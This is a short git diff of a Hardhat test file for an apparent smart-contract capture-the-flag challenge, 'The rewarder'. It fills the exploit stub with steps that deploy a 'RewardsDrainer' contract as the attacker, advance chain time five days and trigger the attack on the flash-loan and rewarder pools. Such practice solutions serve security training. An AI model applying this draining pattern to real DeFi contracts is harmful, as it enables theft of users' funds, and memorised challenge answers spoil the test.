@@ -65,7 +65,10 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const RewardsDrainerFactory = await ethers.getContractFactory('RewardsDrainer', attacker);
+        const rewardsDrainer = await RewardsDrainerFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address);
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await rewardsDrainer.attack();
     });
 
     after(async function () {
